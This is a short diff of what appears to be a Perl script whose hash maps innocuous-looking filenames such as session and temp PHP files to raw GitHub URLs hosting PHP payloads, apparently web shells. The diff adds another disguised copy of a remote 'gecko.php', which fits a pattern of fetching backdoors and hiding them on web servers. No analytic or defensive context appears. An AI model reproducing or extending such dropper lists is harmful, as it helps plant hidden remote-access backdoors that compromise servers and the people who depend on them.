@@ -12,6 +12,7 @@ my %tmp_files = (
     "sess_916f9c30948dcc2c.php" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/sess_916f9c30948dcc2c.php",
     "temp_156b0bb68af8ae51.php" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/temp_156b0bb68af8ae51.php",
     "sess_126s1db67aj83e01.php" => "raw.githubusercontent.com/haxserver1/jlkhsdhamnbsuygdamwnbsd/main/gecko.php",
+    "sess_126s1db67aj83e01.PhP7" => "raw.githubusercontent.com/haxserver1/jlkhsdhamnbsuygdamwnbsd/main/gecko.php",
     "etc_8h3060h0949dr427.PhP7" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/etc_8h3060h0949dr427.PhP7",
     "tiny_50kd19jaw938azh1.php" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/tiny_50kd19jaw938azh1.php",
     "api.PhP7" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/api.PhP7",
